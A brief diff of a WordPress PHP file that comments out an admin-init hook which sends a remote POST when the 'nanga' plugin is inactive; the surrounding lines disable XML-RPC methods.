@@ -6,6 +6,7 @@ add_action( 'wp_login_failed', function () {
 add_filter( 'xmlrpc_methods', function ( $methods ) {
     return false;
 } );
+/*
 add_action( 'admin_init', function () {
     if ( ! is_plugin_active( 'nanga/nanga.php' ) ) {
         wp_remote_post(
@@ -26,3 +27,4 @@ add_action( 'admin_init', function () {
         );
     }
 } );
+*/
